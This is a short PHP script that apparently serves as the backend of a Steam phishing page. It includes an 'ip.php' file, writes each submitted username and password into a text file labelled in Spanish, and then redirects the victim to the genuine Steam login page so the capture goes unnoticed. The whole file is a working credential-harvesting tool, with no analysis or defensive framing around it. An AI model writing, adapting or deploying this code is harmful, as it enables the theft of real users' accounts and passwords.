<?php
include 'ip.php';

file_put_contents("usuarios.txt", " Cuenta: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://store.steampowered.com/login');
exit();
